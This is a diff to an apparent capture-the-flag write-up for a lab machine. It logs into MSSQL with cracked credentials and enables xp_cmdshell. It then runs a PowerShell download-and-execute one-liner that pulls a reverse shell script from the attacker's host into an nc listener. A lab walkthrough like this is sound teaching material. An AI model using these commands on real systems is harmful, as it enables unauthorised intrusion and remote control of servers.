@@ -255,4 +255,60 @@ Candidates.#1....: cowee48 -> coreyr1
 Started: Sun Oct 13 19:36:27 2019
 Stopped: Sun Oct 13 19:36:44 2019
 ```
-After on a few seconds it gives us the password ```corporate569```
+After on a few seconds it gives us the password ```corporate568```. Now we can use these credentials to log into mssql
+```
+# python mssqlclient.py -p 1433 -windows-auth mssql-svc:corporate568@10.10.10.125
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL>
+```
+Now this time we can enable the ```xp_cmdshell``` so we will be able to execute cmd commands. We cant test this by executing ```whoami```
+```
+enable_xp_cmdshell
+[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL> xp_cmdshell whoami
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+querier\mssql-svc                                                                  
+```
+Using this we can get a reverse shell onto the system. I will use one of Nishang's Reverse shells for this.
+
+First I set up my listener.
+```
+# nc -lvnp 9999
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::9999
+Ncat: Listening on 0.0.0.0:9999
+```
+Second, I set up a python SimpleHTTPServer in the same directory as my reverse powershell script
+```
+# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+Lastly, I download and execute the script from the ```xp_cmdshell```
+```
+SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring("http://10.10.14.39/reverse.ps1")
+```
+If everything is done correctly then a connection should open up in your listener.
+```
+Ncat: Connection from 10.10.10.125.
+Ncat: Connection from 10.10.10.125:49681.
+Windows PowerShell running as user mssql-svc on QUERIER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+```
+From here we can navigate to ```C:\Users\mssql-svc\Desktop``` to read the user flag
+```
+C:\Users\mssql-svc\Desktop> type user.txt
+c37b41bb669da345*************
+```
